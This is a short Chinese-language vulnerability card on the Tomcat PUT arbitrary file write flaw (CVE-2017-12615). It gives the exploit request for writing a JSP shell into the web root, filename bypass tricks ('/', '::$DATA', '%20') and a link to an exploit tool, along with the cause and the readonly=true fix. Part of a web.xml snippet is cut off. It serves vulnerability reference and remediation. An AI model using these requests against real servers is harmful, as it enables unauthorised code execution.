# TomcatPUT方法任意文件写入漏洞

- **系统**：Tomcat　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **请求**：`PUT /1.jsp/ HTTP/1.1`

**请求体 / payload**
```
通过发送如下数据包即可在web根目录写入shell：
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
shell
<https://github.com/xiaokp7/Tomcat_PUT_GUI_EXP>
```

**其他**
- Tomcat PUT方法任意文件写入漏洞\_CVE-2017-12615: * 漏洞介绍
* 漏洞原理
  * 漏洞复现
  * 利用工具
* 修复建议
***
- 漏洞介绍: 当 Tomcat 启用了 HTTP PUT 请求方法，且设置了写权限（readonly=false），导致我们可以向服务器写入文件攻击者，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。但限制了jsp后缀，不过对于不同平台有多种绕过方法。
- 漏洞原理: ```plain
 由于Tomcat `conf/web.xml`文件中配置了可写权限（readonly=false）,导致可通过PUT方法向服务器写入文件，但是由于Tomcat对文件后缀会进行检测（不能直接写入jsp）。
```
1. 通用的绕过方法使用`/`结尾，响应码`201`表示成功写入，响应码`204`也表示成功写入，但存在同名文件。
2. windows下可采用`::$DATA`、`%20`绕过
```java
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>

- 修复建议: ```java
将 readonly=true，默认为 true。
```
> 原文: <公众号：渗透安全HackTwo>